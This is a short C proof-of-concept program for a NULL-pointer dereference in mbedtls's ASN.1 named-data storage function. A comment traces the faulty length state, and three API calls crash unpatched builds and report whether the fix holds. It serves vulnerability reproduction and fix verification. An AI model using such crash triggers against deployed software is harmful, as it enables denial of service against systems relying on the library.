#include <stdio.h>
#include <string.h>

#include "mbedtls/asn1write.h"
#include "mbedtls/asn1.h"

/*
 * Minimal PoC for CVE-2025-48965 / mbedtls_asn1_store_named_data().
 *
 * Buggy state transition:
 *   1. Store OID with val_len = 4:
 *        val.p != NULL, val.len = 4
 *   2. Store same OID with val_len = 0:
 *        buggy: val.p = NULL, val.len remains 4
 *        fixed: val.p = NULL, val.len = 0
 *   3. Store same OID with val_len = 4:
 *        buggy: cur->val.len == val_len, so no allocation;
 *               memcpy(cur->val.p, val, val_len) dereferences NULL.
 *        fixed: cur->val.len != val_len, so allocation happens safely.
 */

int main(void)
{
    mbedtls_asn1_named_data *head = NULL;
    mbedtls_asn1_named_data *ret = NULL;

    /* OID 2.5.4.3 = commonName, DER OID content bytes only. */
    const char oid_cn[] = "\x55\x04\x03";
    const size_t oid_len = sizeof(oid_cn) - 1;

    const unsigned char val1[4] = { 0x11, 0x22, 0x33, 0x44 };
    const unsigned char val2[4] = { 0xaa, 0xbb, 0xcc, 0xdd };

    setbuf(stdout, NULL);

    printf("step1: store nonzero value len=4\n");
    ret = mbedtls_asn1_store_named_data(&head, oid_cn, oid_len,
                                        val1, sizeof(val1));
    if (ret == NULL) {
        printf("step1 failed\n");
        return 2;
    }

    printf("after step1: val.p=%p val.len=%zu\n",
           (void *) ret->val.p, ret->val.len);

    printf("step2: store zero-length value len=0\n");
    ret = mbedtls_asn1_store_named_data(&head, oid_cn, oid_len,
                                        NULL, 0);
    if (ret == NULL) {
        printf("step2 failed\n");
        return 2;
    }

    printf("after step2: val.p=%p val.len=%zu\n",
           (void *) ret->val.p, ret->val.len);

    printf("step3: store nonzero value len=4 again; buggy version may crash now\n");
    ret = mbedtls_asn1_store_named_data(&head, oid_cn, oid_len,
                                        val2, sizeof(val2));

    if (ret == NULL) {
        printf("step3 returned NULL\n");
        mbedtls_asn1_free_named_data_list(&head);
        return 2;
    }

    printf("after step3: val.p=%p val.len=%zu\n",
           (void *) ret->val.p, ret->val.len);

    if (ret->val.p != NULL && ret->val.len == sizeof(val2) &&
        memcmp(ret->val.p, val2, sizeof(val2)) == 0) {
        printf("[OK] fixed behavior: value buffer was safely reallocated and updated.\n");
    } else {
        printf("[INFO] unexpected final state\n");
    }

    mbedtls_asn1_free_named_data_list(&head);
    return 0;
}
